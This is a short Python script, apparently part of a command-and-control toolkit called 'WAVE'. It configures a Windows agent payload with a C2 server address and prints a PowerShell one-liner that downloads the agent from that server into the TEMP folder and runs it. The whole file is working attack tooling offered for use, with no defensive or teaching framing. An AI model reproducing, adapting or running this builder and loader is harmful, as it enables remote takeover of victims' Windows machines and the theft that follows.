# WAVE builder: emit a configured Windows agent and one-liners
import os, sys

CONFIG = {
    'c2_url': os.environ.get('WAVE_C2', 'http://127.0.0.1:5000')
}

def generate_agent(output_path='payload_win_configured.py'):
    src = open('payload_win.py','r',encoding='utf-8').read()
    src = src.replace("C2 = os.environ.get('WAVE_C2', 'http://127.0.0.1:5000')",
                      f"C2 = os.environ.get('WAVE_C2', '{CONFIG['c2_url']}')")
    open(output_path,'w',encoding='utf-8').write(src)
    print('Wrote', output_path)

def powershell_loader():
    ps = f"$wc=New-Object System.Net.WebClient;$u='{CONFIG['c2_url']}/raw/agent.py';$t=$env:TEMP+'\\\agent.py';$wc.DownloadFile($u,$t);python $t"
    print(ps)

if __name__=='__main__':
    if len(sys.argv)>1:
        CONFIG['c2_url']=sys.argv[1]
    generate_agent()
    print('\nPowerShell one-liner (adjust python path if needed):')
    powershell_loader()
